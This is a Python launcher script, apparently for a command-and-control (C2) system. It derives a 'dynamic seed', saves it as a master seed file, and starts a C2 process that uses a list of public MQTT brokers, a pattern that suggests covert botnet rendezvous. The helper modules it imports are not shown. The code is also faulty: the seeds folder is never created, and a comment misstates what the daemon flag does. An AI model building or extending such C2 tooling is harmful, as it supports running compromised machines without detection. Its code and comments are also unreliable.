import random
import logging
import os
from multiprocessing import Process
from c2 import start_c2
from seed_harvesting import generate_dynamic_seed
import time

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(process)d - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("main")

BASE_DIR = "dir"
SEEDS_DIR = os.path.join(BASE_DIR, "seeds")
os.makedirs(BASE_DIR, exist_ok=True)

def init_c2():
    while True:
        seed = generate_dynamic_seed()
        if seed:
            break
        time.sleep(random.randint(5, 30))
    seed_file = os.path.join(SEEDS_DIR, f"MASTER___{seed}.txt")
    with open(seed_file, 'w') as f:
        f.write(seed + '\n')
    logger.info(f"seed: {seed}")
    base_brokers_set = os.path.join(BASE_DIR, "public_mqtt_brokers.txt")
    logger.info(f"Starting new c2 with daily seed: {seed}")
    current_process = Process(target=start_c2, args=(seed, base_brokers_set))
    current_process.daemon = False  # This ensures the process will be terminated when the main program exits
    current_process.start()
    logger.info(f"New c2 started with PID: {current_process.pid}")

if __name__ == "__main__":
    init_c2()
